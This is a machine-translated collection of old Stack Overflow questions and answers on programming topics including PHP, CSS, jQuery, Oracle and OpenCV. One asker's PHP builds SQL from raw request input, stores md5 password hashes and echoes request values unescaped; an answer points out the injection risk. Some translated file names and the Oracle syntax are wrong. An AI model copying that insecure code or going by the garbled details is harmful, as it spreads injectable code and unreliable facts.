typename viewTraits<N,T>::result_type c( T const &t )
{
    typename viewTraits<N,T>::result_type retVal;

    for(typename T::const_iterator it(t.begin()); it<t.end();++it){
        retVal.push_back(fusion::deref(fusion::begin(fusion::as_nview<N>(*it))));
    }
    return retVal;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:36:08.140

您的代码有两个直接问题：

*   您计算`fusion::as_nview<N>(*it)`并尝试将其存储为`fusion::result_of::as_nview<T::value_type, N>::type`; 事实上它是一个`fusion::result_of::as_nview<T::value_type const, N>::type`(`*it`有类型`T::const_reference`); 这是您的`const`-related 错误的来源。

*   您尝试累积结果视图，但是，据我所知，从[Fusion 文档](http://www.boost.org/doc/libs/1_52_0/libs/fusion/doc/html/fusion/view/nview.html)中可以看出，此类视图上的有效操作主要是 Fusion 随机访问序列的操作。特别是您不能将两个视图添加在一起，或者默认构造一个。这是一个可能的修复方法（但绝不是唯一的方法），但未经过实际测试：

    ```
    typedef typename Container::value_type view_type;
    typedef typename fusion::result_of::at_c<view_type, 0>::type reference;
    // boost::decay is from Boost.TypeTraits
    typedef typename boost::decay<reference>::type value_type;
    value_type zero = 0;
    return std::accumulate(container.begin(), container.end(), zero, add_views()); 
    ```

    where`add_views`是一个函子，它以 的精神返回一些东西`lhs + at<0>(rhs)`。`c`请注意，只有当您打算将长度视图设为一个时，此解决方案才真正有意义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:44:31.943

你的`Sequence`类型不是`T::value_type`，它是`const T::value_type`。尝试写作`typedef const typename T::value_type etype;`。

# r - AWS EC2上doredis中的套接字连接错误

> ID：13491202
> 
> 赞同：1
> 
> 时间：2012-11-21T10:26:52.357
> 
> 标签：r, parallel-processing, amazon-ec2, redis

我已经设置了一个实例以用作 redis 工作者。所有端口都是开放的。当我发出

```
library("doRedis")
redisWorker(host="ZZZ-23-20-XXX-XXX.compute-1.amazonaws.com", queue="jobs") 
```

我得到了错误

```
Error in socketConnection(host, port, open = "a+b", blocking = TRUE, timeout = timeout) : 
  cannot open the connection
In addition: Warning message:
In socketConnection(host, port, open = "a+b", blocking = TRUE, timeout = timeout) :
  ZZZ-23-20-XXX-XXX.compute-1.amazonaws.com:6379 cannot be opened 
```

任何想法可能会发生什么？我也使用了内部 EC2 IP (10.XXX.XXX.ZZZ) 仍然得到同样的错误。服务器已启动，正在运行并且`ping`能够

我正在运行最新最好的 R、doRedis、Ubuntu 12.04 都已完全更新。之前已经讨论过这个问题，但没有找到解决方案。[doRedis 在 Ubuntu Linux、R 和 RStudio 中出现奇怪的套接字连接错误](https://stackoverflow.com/questions/11732368/doredis-with-strange-socket-connection-error-in-ubuntu-linux-r-and-rstudio)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T18:12:57.337

尽管使用 registerDoRedis() 我也遇到过类似的问题，因为您无法设置超时，我认为问题在于函数“redisConnect”中使用的超时值。

在 R 中，如果您运行 fix(redisConnect) 并且您可以看到超时的默认值如下：

redisConnect <- function (host = "localhost", port = 6379, returnRef = FALSE, timeout = 2147483647L)

似乎这个巨大的超时值导致了这个问题。要检查在使用它的行上更改它：

```
con <- socketConnection(host, port, open = "a+b", blocking = TRUE, 
    timeout = timeout) 
```

对此：

```
con <- socketConnection(host, port, open = "a+b", blocking = TRUE, 
    timeout = 30) 
```

我发现这很有效，尽管一旦您重新加载包，更改就会被擦除。我今天才发现这个，所以将向开发人员提交一个错误。顺便说一句，我在 OSX 上运行 R 2.15。

您使用的函数*应*默认为超时 30，或者您可以尝试在函数调用上设置它以确保而不是修复（）底层代码。

# excel - 在excel中选择具有特定值的单元格的相邻单元格

> ID：13491209
> 
> 赞同：0
> 
> 时间：2012-11-21T10:27:17.067
> 
> 标签：excel, ms-office, excel-formula

我在excel中有一个四列的数据集；

用户名、计算机、部门信息

我使用过滤器来选择数据集中所有唯一的用户名，然后使用 counif() 来计算用户名在数据集中出现的次数 - 这很好用。

现在我想在每次出现特定用户名时搜索原始数据集，当它出现时，我想选择该相关行的“信息”单元格。所以输出将是一个数组而不是一个值，

例子，

```
用户名|信息
1
A2
乙 3
4
D 5
```

因此，如果我使用我的函数从用户名 A 的“信息”中搜索所有值，我希望这个输出，

```
信息
1
2
4

```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T15:11:59.850

这是一种不涉及 VBA 的方法。不过，它可能不适合您的需求。

1.  根据您的数据制作数据透视表
2.  将**用户名**添加到过滤器
3.  将**信息**添加为一行
4.  将过滤器从*（全部）*更改为您想要的用户名。

如果您需要重新运行基础数据集，只需右键单击以刷新数据透视表。

# css - 如何创建固定宽度的侧边栏和全宽内容

> ID：13491211
> 
> 赞同：4
> 
> 时间：2012-11-21T10:27:18.310
> 
> 标签：css, html, fluid-layout

我想创建一个带有侧边栏和内容的页面。侧边栏已固定`width(200px)`，内容应为

> （body_width - 侧边栏宽度）

. 因此在 jQuery 中创建并完美运行。

**编辑**

[例子](http://jsfiddle.net/WSgwp/)

但我想知道，这可能只在 CSS 中实现吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-21T11:00:43.733

您可以`display: table;`在包含的 div 上然后`display: table-cell;`在内部 div 上执行此操作。然后，您可以对侧边栏应用最小宽度，内容将占据页面的其余部分。

可以在[这里找到演示](http://jsfiddle.net/WSgwp/5/)

不要让使用`display: table`让您失望-这不是使用表格标记或使您的 html 语义减少。它只是让您的浏览器将 div 视为表格单元格（这正是您所需要的）

**HTML：**

```
<div id="main_wrap">
    <div id="sidebar">1</div>
    <div id="content">2</div>
</div>​ 
```

**CSS：**

```
#main_wrap { 
    display: table;
}

#sidebar {
    background:red;
    min-width: 200px;
    display: table-cell;
}

#content {
    background:blue;
    display: table-cell;
    width: 100%;
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-21T10:46:13.560

嘿，你可以用纯**css**得到你想要的`margin-left:200px;`给你`#content`

**CSS**

```
#main_wrap {
border:3px solid green;
}

#sidebar{
        background:red;
        width: 200px;
        float:left;
    }

#content{
    background:blue;
    margin-left:200px;   
} 
```

**[演示](http://jsfiddle.net/WSgwp/15/)**

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-04-12T01:58:00.590

您可以尝试使用负边距。

完整的解释和示例（带演示）： [https ://shellcreeper.com/responsive-fixed-width-sidebar-why-and-how/](https://shellcreeper.com/responsive-fixed-width-sidebar-why-and-how/)

**HTML：**

```
<div class="wrapper">

    <div class="content">
    </div><!-- .content -->

    <div class="sidebar">
    </div><!-- .sidebar -->

</div><!-- .wrapper --> 
```

**CSS：**

```
.wrapper{
    margin-right: 200px;
}
.content{
    width: 100%;
    float: left;
}
.sidebar{
    float: right;
    width: 200px;
    margin-right: -200px;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:37:38.250

你可以用css做到这一点，只需从#content中删除宽度和浮动。

```
#content{
    background:blue;
} 
```

检查[jsFiddle 文件](http://jsfiddle.net/WSgwp/1/)

# javascript - 如果下拉值 = X 使用 jQuery 则显示输入区域

> ID：13491219
> 
> 赞同：1
> 
> 时间：2012-11-21T10:27:37.763
> 
> 标签：javascript, jquery

如果特定选择值为 = X，我正在尝试显示输入字段。

我有一个下拉菜单询问我的用户是否要添加其他与会者，如果他们选择 1/2 与会者，我希望出现相关的下拉菜单。

我试过编写一个函数，但它不能正常工作，就像你不止一次地改变你的参加者值一样，你会看到一些输入字段出现而一些消失？

我添加了一个小提琴来表达我的意思，任何帮助表示赞赏！

**jQuery**

```
/* Attendee Dropdown */
function attendees() {
    // Function 
    if ($('select[name^="add-attend"]').val() == "1") {     
       $('.attend-1').removeClass('nodisplay');
       $('.attend-1').toggle();         
    }
    else if ($('select[name^="add-attend"]').val() == "2") {     
      $('.attend-1').removeClass('nodisplay');
      $('.attend-2').removeClass('nodisplay');
      $('.attend-1').toggle(); 
      $('.attend-2').toggle();           
    }
    else {     
       $('.attend-1').addClass('nodisplay'); 
       $('.attend-2').addClass('nodisplay');           
    }; 
};
$('.add-attend').change(attendees); 
```

**小提琴**

[http://jsfiddle.net/7LxF8/](http://jsfiddle.net/7LxF8/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:31:53.187

这是使用`.show()` [http://jsfiddle.net/7LxF8/1/的小提琴更新](http://jsfiddle.net/7LxF8/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:34:06.093

```
$('.add-attend').on('change', function() {
    var elm1 = $('.attend-1'),
        elm2 = $('.attend-2');
    switch (this.value) {
        case '0':
            elm1.add(elm2).hide();
            break;
        case '1':
            elm1.show();
            elm2.hide();
            break;
        case '2':
            elm1.add(elm2).show();
    }
});​ 
```

[**小提琴**](http://jsfiddle.net/7LxF8/6/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:36:07.677

您可以选择 li 元素和使用`filter`方法。

```
function attendees() {
    $('li[class^="attend"]')
        .hide()
        .filter('[class=attend-' + this.value + ']')
        .show()
};
$('.add-attend').change(attendees); 
```

[http://jsfiddle.net/LPRYr/](http://jsfiddle.net/LPRYr/)

# javascript - 如果不存在字符串，则重定向到其他 URL [JAVASCRIPT]

> ID：13491226
> 
> 赞同：0
> 
> 时间：2012-11-21T10:27:53.847
> 
> 标签：javascript, string, types, indexing, undefined

在我的 php 页面中，出现“未定义索引类型”的错误。但是，如果使用字符串打开相同的 URL，例如 mypage.php?type=abc，则不会显示此错误！

我想重定向没有字符串的用户，即从 mypage.php 到 mypage.php?type=abc

我决定更好地纠正php！php代码如下

```
<?
if (($_REQUEST["type"] == "mz") || ($_REQUEST["type"] == "ie") || ($_REQUEST["type"] == "iea")) {
?>
    <link rel="SHORTCUT ICON" href="icons/<?= $_REQUEST['id'] ?>_favicon.ico" type="image/x-icon">
<?
}
?>

<?
if ($_REQUEST["type"] == "mza") {
?>
    <link rel="icon" href="icons/<?= $_REQUEST['id'] ?>_extra_animated_favicon.gif" type="image/x-icon">
<? } ?> 
```

2行和最后一行有错误

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:33:43.057

如果我理解正确，你想这样做：

```
window.location.href = window.location.origin + window.location.pathname + '?type=abc'; 
```

更好的是，修复您的 PHP 代码，这样您就不会在通知中收到任何警告！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:35:17.133

要么更正 PHP 文件中的问题，要么添加 .htaccess 条目以直接重定向用户。

我建议在 PHP 文件中添加一些代码，如下所示：

```
if (!isset($_GET)) { //or you can use more specifically if (!isset($_GET['type'])) { 

//there is no get variables here so we either add a local variable or redirect (which is redundant)

$type = "abc"; //or even $_GET['type'] = "abc";

//redirect header("location: mypage.php?type=abc");

}else{

//execute work

} 
```

更改 .htaccess 需要某些人没有的某些特权。

编辑：这样做的 javascript 方式也是可能的，但也是最*滞后*且不太推荐的。

**针对您的更新：**

您可能需要在使用 $_REQUEST['id'] 之前检查它；（您可以按照我上面介绍的方式进行操作）

```
if (isset($_REQUEST['id'])) {

//do your code

}
else {

//no ID here

} 
```

也可能是您的服务器不支持短标签（`<?= ?>`），请尝试使用 echo 代替：

```
echo "<link blah blah blah=\"$_REQUEST[id]_icon.ico\" blah />"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:39:01.577

检查这个

```
<script type="text/javascript">

function urlRD(){
if (location.href == "http://mypage.php")
window.location = "http://mypage.php?type=abc"
}

</script> 
```

进而：

```
<body onLoad="urlRD()"> 
```

# sql - 在 ms 访问查询中使用 iif 时出错

> ID：13491227
> 
> 赞同：1
> 
> 时间：2012-11-21T10:27:54.630
> 
> 标签：sql, ms-access

我正在尝试在 MS Access 中触发此查询

```
SELECT file_number, 
    IIF(invoice_type='Spent on Coding',SUM(CINT(invoice_amount)), 0) as CodingExpense 
FROM invoice
GROUP BY file_number 
```

我收到此错误

> 函数参数列表中的错误：“=”无法识别。无法解析查询文本。

我尝试替换`IIF`为`SWITCH`无济于事。
我的查询有什么问题以及如何更正？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:56:57.557

AFAIK，你需要反过来：

```
Sum(IIF(invoice_type="Spent on Coding",CINT(invoice_amount), 0)) as CodingExpense 
```

但是，我建议：

```
Round(Sum(IIF(invoice_type="Spent on Coding",invoice_amount, 0)),0) as CodingExpense 
```

# java - 通过 javax 拦截器记录用户的会话 ID

> ID：13491235
> 
> 赞同：3
> 
> 时间：2012-11-21T10:28:21.650
> 
> 标签：java, logging, java-ee-6, cdi, interceptor

我创建了一个拦截器，其方法使用 @AroundInvoke 注释来记录方法调用和相关的计时。这是基于 Richard Hightowers 在 CDI AOP [http://java.dzone.com/articles/cdi-aop](http://java.dzone.com/articles/cdi-aop))上发表的优秀博客文章：

```
@AroundInvoke
public Object log(InvocationContext ctx) throws Exception {
    Logger logger = Logger.getLogger(ctx.getTarget().getClass().getName());

    logger.trace("ENTERING : "+ctx.getMethod());

    long start = System.currentTimeMillis();

    Object returnMe = ctx.proceed();

    long executionTime = System.currentTimeMillis() - start;

    logger.trace("EXITING : "+ctx.getMethod()+":"+executionTime+"ms");

    return returnMe;
} 
```

我想记录用户的会话 ID，以便我可以轻松地分析通过应用程序的用户路径。如何获取用户的会话？

我查看了注入 SessionContext 但看不到如何使用 API 来提取此值。

我查看了 log4j MDC，但我希望避免添加 servlet 过滤器的需要。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T18:31:46.010

真的，我的问题应该是“如何记录方法调用，以便可以轻松地将通过应用程序的给定用户路径从日志文件中解析出来？”。就目前的问题而言，假设获取会话 ID 是答案，但很可能并非如此。考虑到这个措辞更好的问题，我现在发现只要通过 EJB 访问所有关注的业务逻辑，您确实可以按如下方式记录给定的用户路径：

创建一个注入了 EJB SessionContext 的拦截器类：

```
/**
* SessionContext of this EJB; this will be injected by the EJB
* Container because it's marked w/ @Resource
*/
@Resource
private SessionContext context; 
```

添加一个使用 AroundInvoke 注释的方法，该方法将拦截调用：

```
@AroundInvoke
public Object log(InvocationContext ctx) throws Exception {
    String originName = Thread.currentThread().getName();
    String currentUser = context.getCallerPrincipal().getName();
        try{
           String tracingName = currentUser + " " + originName;
           Thread.currentThread().setName(tracingName);
           return ctx.proceed();
        }finally{
            Thread.currentThread().setName(originName);
        }
    } 
```

请注意，我们使用会话上下文来获取导致此操作的用户。然后我们更改线程的名称以保存该用户名。此调用堆栈中的所有后续日志记录都将输出用户名，假设 loggin 被配置为也输出线程名，无论它们是在 EJB 中还是只是一些 POJO 类。

此线程重命名的灵感来自 Adam Bien 的服务器独立线程跟踪实用程序：

[http://www.adam-bien.com/roller/abien/entry/server_independent_thread_tracking_utility](http://www.adam-bien.com/roller/abien/entry/server_independent_thread_tracking_utility)

将其更改为将线程重命名为用户名是我所做的修改。

# objective-c - 无法从 tcp 端口读取数据

> ID：13491239
> 
> 赞同：0
> 
> 时间：2012-11-21T10:28:38.683
> 
> 标签：objective-c, ios, objective-c-blocks

我已经编写了从 tcp 端口 3000 读取数据的代码

```
- (BOOL)connect
{
int cIter = 0;
while(cIter++<5)
{
    CFReadStreamRef readStream;
    CFWriteStreamRef writeStream;
    @try{
        CFStreamCreatePairWithSocketToHost(NULL, (__bridge CFStringRef)M_CONNECT_HOST, M_CONNECT_PORT, &readStream, &writeStream);
    }
    @catch (NSException *ex) {

    }
    if(readStream!=nil && writeStream!=nil)
    {
        m_sin = (__bridge NSInputStream *)readStream;
        m_sout = (__bridge NSOutputStream *)writeStream;
        [m_sin setDelegate:self];
        [m_sout setDelegate:self];

        [m_sin scheduleInRunLoop:[NSRunLoop currentRunLoop] forMode:NSDefaultRunLoopMode];
        [m_sout scheduleInRunLoop:[NSRunLoop currentRunLoop] forMode:NSDefaultRunLoopMode];
        [m_sin open];
        [m_sout open];

        return  true;
    }
}
return false;
} 
```

当我写入 tcp 输出流时它的工作但是当我尝试从 tcp 输入流中读取它时它没有读取我的意思是我的 [m_sin read:t maxlength:10]; 总是返回 -1（其中 m_sin 是我的输入流）

我通过终端将数据传递到 tcp 端口

请帮我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:07:41.057

实现**handleEvent**并检查**eventCode**

```
 -(void)stream:(NSStream *)aStream handleEvent:(NSStreamEvent)eventCode{

    switch (eventCode) {
        case NSStreamEventOpenCompleted:
            NSLog(@"stream opened");
            break;

        case NSStreamEventHasBytesAvailable:            

            if (aStream == inputStream) {
                // read it in
                unsigned int len = 0;
                len = [inputStream read:buf maxLength:1019];
                buf[len] = '\0';

                if(!len) {

                    if ([aStream streamStatus] != NSStreamStatusAtEnd){

                        NSLog(@"Failed reading data from peer");

                    }

                } else {

                     //I am reading UIImage here                 
                     NSData *data = [NSData dataWithBytes:(const void *)buf length:1019];                    
                     UIImage *image = [UIImage imageWithData:data];
                     self.transferedimage.image = image;

                }
            }

            break;

        case NSStreamEventErrorOccurred:
            NSLog(@"stream ErrorOccurred");
            break;

        case NSStreamEventEndEncountered:
            NSLog(@"stream EndEncountered");
            break;

        default:
            NSLog(@"stream UnKnown");
            break;
    }
} 
```

# mobile-safari - 移动网站使用锚墨水隐藏地址栏 Safari 浏览器

> ID：13491240
> 
> 赞同：0
> 
> 时间：2012-11-21T10:28:40.307
> 
> 标签：mobile-safari, scrollto, address-bar

下面是用于隐藏 Safari 移动设备上地址栏的功能，但是如何构建一些额外的逻辑，该功能仅在 URl 中没有 # 时才会启动。因为当有 # 时，它需要移动到锚链接。

所以，当我有[http://www.mymobilesite.com/index.html#start](http://www.mymobilesite.com/index.html#start)下面的功能不需要运行。

```
 <script type="text/javascript">
  window.addEventListener("load",function() {
  // Set a timeout...
  setTimeout(function(){
  // Hide the address bar!
  window.scrollTo(0, 1);
  }, 0);
  });
  </script> 
```

提前致谢！马切利诺

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T03:31:31.587

测试是否存在哈希：

```
if(!window.location.hash) 
```

[http://mobile.tutsplus.com/tutorials/mobile-web-apps/remove-address-bar/](http://mobile.tutsplus.com/tutorials/mobile-web-apps/remove-address-bar/)

# python - 如何将用户名添加到网页顶部的导航栏？

> ID：13491242
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:28:45.917
> 
> 标签：python, django

登录后，我的注册/登录框应该被删除，取而代之的是一个包含已登录用户名并链接到用户个人资料的框。

如何实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:45:52.440

在您的模板中：

```
{% if user.is_authenticated %}
    <!-- display nav bar for the logged in user -->
{% else %}
    <!-- display login form or whatever you need -->
{% endif %} 
```

使用 django，您始终可以在请求中使用经过身份验证的用户，这个简单的 if/else 语句可以帮助您满足您的需求。您显然可以将其设为 ajax 调用并调用 html 而无需新请求

[文档中的](https://docs.djangoproject.com/en/dev/topics/auth/#django.contrib.auth.models.User.is_authenticated)更多信息

# php - 'where 子句'中的未知列'member_id'

> ID：13491246
> 
> 赞同：1
> 
> 时间：2012-11-21T10:28:56.450
> 
> 标签：php, where-clause

我已经在这个网站上搜索了解决方案，但没有结果。我被困在以下问题上，我的代码**在 'where 子句'**错误中给出了 Unknown Colum 'member_id'。以前没听说过。。所以我现在有点困惑。

这是我的代码：

```
<?php
require("db.php");
$id = $_REQUEST['member_id'];

$result = mysql_query("SELECT * FROM members WHERE member_id = '$id'");
$test = mysql_fetch_array($result);
if (!$result)
    {
    die("Error: Data not found..");
    }
$admin=$test['admin'] ;
$firstname=$test['firstname'] ;
$lastname=$test['lastname'] ;
$mail= $test['mail'] ;
$login=$test['login'] ;
$passwd=$test['passwd'] ;

if(isset($_POST['save']))
{
$admin_save = $_POST['admin'];
$firstname_save = $_POST['firstname'];
$lastname_save = $_POST['lastname'];
$mail_save = $_POST['mail'];
$login_save = $_POST['login'];
$passwd_save = md5($_POST['password']);

mysql_query("UPDATE lijst SET admin ='$admin_save',firstname ='$firstname_save',lastname ='$lastname_save', mail ='$mail_save', login ='$login_save',
     passwd ='$passwd_save' WHERE member_id = '$id'")
            or die(mysql_error());
echo "Saved!";

header("Location: main.php");
}
mysql_close($conn);
?> 
```

表格 ：

```
<form method="post">
<table>
    <tr>
        <td>Admin</td>
        <td><input type="text" name="admin" class="text w_20" value="<?php echo $admin ?>"/></td>
    </tr>
    <tr>
        <td>Voornaam</td>
        <td><input type="text" name="firstname" class="text w_20" value="<?php echo $firstname ?>"/></td>
    </tr>
    <tr>
        <td>Achternaam</td>
        <td><input type="text" name="lastname" class="text w_20" value="<?php echo $lastname ?>"/></td>
    </tr>
    <tr>
        <td>E-mail</td>
        <td><input type="text" name="mail" class="text w_20" value="<?php echo $mail ?>"/></td>
    </tr>
    <tr>
        <td>Gebruikersnaam</td>
        <td><input type="text" name="login" class="text w_20" value="<?php echo $login ?>"/></td>
    </tr>
    <tr>
        <td>Password</td>
        <td><input type="text" name="passwd" class="text w_20" value="<?php echo $passwd ?>"/></td>
    </tr>
    <tr>
        <td>&nbsp;</td>
        <td><input type="submit" name="save" value="update" /></td>
    </tr>
</table>
</form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:31:38.910

`member_id`错误是说数据库表中没有字段`lijst`。`WHERE`从子句中添加字段或删除条件。

鉴于您刚刚发布的 SQL，您的表称为`members`not `lijst`。所以改变查询：

```
UPDATE members ...... 
```

编辑：您的 MD5 问题是因为您的 html 输入已命名`passwd`，但您的目标`password`是 POST 数组：

```
$passwd_save = md5($_POST['password']); 
```

改成：

```
$passwd_save = md5($_POST['passwd']); 
```

最后，您的查询容易受到 SQL 注入的攻击。作为快速修复，通过`mysql_real_escape_string()`. 或者更好的是，切换到现代 MySQL API，例如 PDO，并使用参数化查询。

# oracle - 如何永久更改 V$NLS_PARAMETERS？

> ID：13491248
> 
> 赞同：1
> 
> 时间：2012-11-21T10:29:07.553
> 
> 标签：oracle, oracle11g

我需要改变`V$NLS_PARAMETER`。目前默认`NLS_LANGUAGE`是`American`，我想改一下`ENGLISH`。Alter session 仅修改当前会话。

如何永久修改它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:51:55.293

您可以设置不同级别的 NLS 参数

1.  作为实例/服务器上的初始化参数。

    SQL>alter system set V$NLS_PARAMETER = 'XXX' scope = both;

2.  作为客户端上的环境变量。

    % setenv NLS_SORT FRENCH

3.  作为 ALTER SESSION 参数。

    SQL> 更改会话集 V$NLS_PARAMETER = = 'XXX'

任何设置都会覆盖更高级别的设置。因此，将其设置为服务器端并不能保证所有连接的客户端都使用该设置。

如果要确保为每个连接的客户端设置它，请使用登录触发器。即使这样，用户也可以显式覆盖“默认”设置

# asp.net - 动态数据的文件上传

> ID：13491250
> 
> 赞同：0
> 
> 时间：2012-11-21T10:29:12.473
> 
> 标签：asp.net, file-upload, updatepanel

我有以下代码

```
<asp:Content ID="headContent" ContentPlaceHolderID="head" runat="Server">
</asp:Content>
 <asp:Content ID="Content1" ContentPlaceHolderID="ContentPlaceHolder1" runat="Server">
<asp:DynamicDataManager ID="DynamicDataManager1" runat="server" AutoLoadForeignKeys="true">
    <DataControls>
        <asp:DataControlReference ControlID="FormView1" />
    </DataControls>
</asp:DynamicDataManager>
<h2 class="DDSubHeader">
    Edit entry from table
    <%= table.DisplayName %></h2>
<asp:UpdatePanel ID="UpdatePanel1" runat="server">
    <ContentTemplate>
        <asp:ValidationSummary ID="ValidationSummary1" runat="server" EnableClientScript="true"
            HeaderText="List of validation errors" CssClass="DDValidator" />
        <asp:DynamicValidator runat="server" ID="DetailsViewValidator" ControlToValidate="FormView1"
            Display="None" CssClass="DDValidator" />
        <asp:FormView runat="server" ID="FormView1" DataSourceID="DetailsDataSource" DefaultMode="Edit"
            OnItemCommand="FormView1_ItemCommand" OnItemUpdated="FormView1_ItemUpdated" RenderOuterTable="false"
            OnPageIndexChanging="FormView1_PageIndexChanging">
            <EditItemTemplate>
                <table id="detailsTable" class="DDDetailsTable" cellpadding="6">
                    <asp:DynamicEntity runat="server" Mode="Edit" />
                    <tr class="td">
                        <td colspan="2">
                            <asp:LinkButton runat="server" CommandName="Update" Text="Update" />
                            <asp:LinkButton runat="server" CommandName="Cancel" Text="Cancel" CausesValidation="false" />
                            <br />
                        </td>
                        <td>

                            <asp:FileUpload ID="FileUpload1" runat="server" />
                            <asp:Label ID="lblMessage" runat="server">
                            </asp:Label>
                            <asp:Button ID="btnUpload" runat="server" OnClick="btnUpload_Click" Text="Upload" />

                        </td>
                    </tr>
                </table>
            </EditItemTemplate>
            <EmptyDataTemplate>
                <div class="DDNoItem">
                    No such item.</div>
            </EmptyDataTemplate>
        </asp:FormView>
        <asp:LinqDataSource ID="DetailsDataSource" runat="server" EnableUpdate="true" />
        <asp:QueryExtender TargetControlID="DetailsDataSource" ID="DetailsQueryExtender"
            runat="server">
            <asp:DynamicRouteExpression />
        </asp:QueryExtender>
    </ContentTemplate>
</asp:UpdatePanel> 
```

该文件是使用动态数据生成的。我正在尝试在表单中添加文件上传控件，但在后面的代码中我无法访问“FileUpload1”以查看它是否包含元素。我怎样才能做到这一点？

如果我制作一个新表格，它可以工作，但我无法让它在我现有的表格中工作。

```
 <form id="form1" runat="server"></form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:34:59.537

这是常见的问题。您正在尝试从更新面板调用上传的 ajax 请求上传文件。但是您需要完整的回传才能使用严肃的 FileUpload 上传它，或者寻找基于 javascript 的文件上传控件。

# excel - 在 vba 中，在下一个树代码中移动行更有效的是什么

> ID：13491251
> 
> 赞同：0
> 
> 时间：2012-11-21T10:29:16.437
> 
> 标签：excel, vba

您好，我有一个问题，下一个代码树在 VBA 中的效率更高

选项1：

```
While fin 

    if activecell.value = "Comp"
        ' do something 
        ' I use some many time the value of the activecell or the line 
        ' im actually
    end if

    activecell.offset(1,0).activate

loop 
```

选项 2：

```
dim i as long
i=0

While fin 

    if activecell.offset(i,0).value = "Comp"
        ' do something 
        ' I use some many time the value of the activecell or the line 
        ' im actually
    end if

    i = i + 1
loop 
```

选项3：'因为我使用了很多次我不知道的实际行'如果将这个值带到变量中可能会更好

```
dim i as long
dim x as string
i=0

While fin 

    x = activecell.offset(i,0)

    if x = "Comp"
        ' do something 
        ' I use some many time the value of the activecell or 
        'the line im actually
    end if

    i = i + 1
loop 
```

在此先感谢您的帮助

PD FOR我所有的代码

```
Application.ScreenUpdating = False
Application.Calculation = xlCalculationManual
Application.EnableEvents = False
ActiveSheet.DisplayPageBreaks = False
Application.DisplayAlerts = False 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:32:04.913

选项4，即你没有写的选项4，比你的选项1-3效率高得多。不要费心激活或抵消任何细胞。只需将您的数据加载到 Variant 数组中，然后对其进行操作。

```
Dim v As Variant
Dim i As Long

v = Sheet1.Range("A1:A1000").Value ' or wherever your data is

For i = 1 To UBound(v, 1)
    If v(i, 1) = "Comp" Then
        ' do something
    End If
Next i 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:37:30.567

选项 2。

使用选项 1，您将在每次迭代时激活单元格，这是不必要的。选项 3 您正在设置一个变量，但只使用一次，因此设置中有成本，但在初始检查之外没有用处。

此外，在检查使用 Value2 时，它不会检查货币/日期，并且字符串将比当前使用的隐式 .Value 更快：

```
if activecell.offset(i,0).Value2 = "Comp" 
```

# asp.net-mvc - Asp Net MVC Membership - 检索角色的访问规则。有方法吗？

> ID：13491252
> 
> 赞同：0
> 
> 时间：2012-11-21T10:29:18.083
> 
> 标签：asp.net-mvc, asp.net-mvc-4, access-rules

有没有办法从特定角色检索所有访问规则？

由于角色只是标记在操作的顶部或整个类的顶部，因此我无法找到检索此信息的方法，除非我读取并解析整个文件，然后找到链接此 [authorization] 标记的方法到一组。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:37:01.940

不，没有内置的方法。它甚至是不可能的，因为您也可以在代码（操作/视图）中检查角色。

*以及应该如何返回访问规则*列表？

例如，算法应如何在视图中返回/命名此访问规则：

```
@if(User.IsInRole("SomeRole") {
   <div>
       Show some html only visible for users in SomeRole
   </div>
} 
```

您必须自己管理应用程序定义的访问规则列表 - 我的列表将非常适合您的应用程序。

当然，当您只使用该`Authorize`属性时，您可以通过反映所有控制器类来生成给定角色可访问的操作方法列表。

# python - python中没有highgui

> ID：13491253
> 
> 赞同：2
> 
> 时间：2012-11-21T10:29:23.970
> 
> 标签：python, opencv

我正在尝试使用 opencv 和 python 编写一些程序。我从存储库安装了 opencv 和 python 库。我正在使用 ubuntu 12.04。该文件夹`/var/lib/python-support/python2.7`仅包含 5 个文件：

*   简历2.so
*   简历
*   简历.pyc
*   simplegeneric-0.7.egg-info
*   简单通用的.py
*   简单通用的.pyc

根据我所做的阅读，我认为这里应该有一个`opencv`文件夹。我可以使用导入 cv 库

```
 import cv 
```

但

```
 from opencv import cv 
```

而且我无法加载 highgui 模块。有什么办法可以解决这个问题？我真的很想在opencv中做点什么

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-03T12:04:47.480

您必须已安装 OpenCV >= 2.3.1。在 OpenCV 2.3.1 及更高版本中，Python 绑定没有 highgui。

```
import cv2
import cv2.cv as cv 
```

你可以走了。

```
import cv2
img  = cv2.imread("image name")
cv2.imshow("window name", img)
cv2.waitKey(0) 
```

[您可以在OpenCV 文档](http://docs.opencv.org/)上找到更多帮助，还可以查看我在[这里](http://jayrambhia.wordpress.com/tag/opencv)所做的一些 opwncv 内容。

我希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-03T11:58:03.433

您将在 include/opencv/highgui.h 中的 OpenCV 文件夹（安装文件夹）中获得 highgui 文件。

